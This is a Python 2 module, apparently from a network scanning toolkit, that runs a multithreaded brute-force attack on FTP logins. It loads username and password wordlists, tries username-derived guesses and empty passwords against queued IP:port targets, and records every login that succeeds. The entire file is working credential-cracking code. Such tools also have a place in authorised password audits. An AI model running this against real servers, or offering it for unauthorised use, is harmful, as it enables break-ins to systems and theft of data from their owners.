#coding=utf-8
import time
import re
import threading
from threading import Thread
from lib.printers import printPink,printRed,printGreen
from Queue import Queue
from ftplib import FTP

def file2list(filename):
    try:
        list=[]
        d=open(filename,'r')
        data=d.readline().strip('\r\n')
        while(data):
            list.append(data)
            data=d.readline().strip('\r\n')
    except Exception,e:
        if e[0]==2:
            lock.acquire()
            printRed("not such file:%s\r\n" %filename)
            lock.release()
    return list




def ftp_connect(ip,username,password,port):
    crack=0
    try:
        ftp=FTP()
        ftp.connect(ip,str(port))
        ftp.login(user=username,passwd=password)
        crack=1
        ftp.close()
    except Exception,e:
        #print e
        lock.acquire()
        print "%s ftp service 's %s:%s login fail " %(ip,username,password)
        lock.release()
        return crack
        pass
    return crack

def ftp():
    while True:
        ip,port=sp.get()
        flag=0
        usernames=file2list('ftp_user.txt')
        passwords=file2list('ftp_pass.txt')

        for username in usernames:
            if ftp_connect(ip,username,username,port)==1:
                lock.acquire()
                printGreen("%s ftp service at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,username))
                result.append("%s ftp service at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,username))
                lock.release()
                break

            if ftp_connect(ip,username,username+'123',port)==1:
                    lock.acquire()
                    printGreen("%s ftp service at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,username+'123'))
                    result.append("%s ftp service at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,username+'123'))
                    lock.release()
                    break
            if ftp_connect(ip,username,username+'123456',port)==1:
                    lock.acquire()
                    printGreen("%s ftp service at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,username+'123456'))
                    result.append("%s ftp service at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,username+'123456'))
                    lock.release()
                    break

            if ftp_connect(ip,username,'',port)==1:
                lock.acquire()
                printGreen("%s ftp service at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,''))
                result.append("%s ftp service at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,''))
                lock.release()
                break
            for password in passwords:
                if ftp_connect(ip,username,password,port)==1:
                        lock.acquire()
                        printGreen("%s ftp service at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        result.append("%s ftp service at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        lock.release()
                        flag=1
                        break
            if flag==1:
                flag=0
                break
        sp.task_done()

def ftp_main(ipdict,threads):

    printPink("crack ftp  now...")
    print "[*] start crack ftp  %s" % time.ctime()
    starttime=time.time()
    global sp
    sp=Queue()
    global lock
    lock = threading.Lock()
    global result
    result=[]

    for i in xrange(threads):
        t = Thread(target=ftp)
        t.setDaemon(True)
        t.start()

    for ip in ipdict['ftp']:
        sp.put((str(ip).split(':')[0],int(str(ip).split(':')[1])))

    sp.join()

    print "[*] stop ftp serice  %s" % time.ctime()
    print "[*] crack ftp done,it has Elapsed time:%s " % (time.time()-starttime)
    return result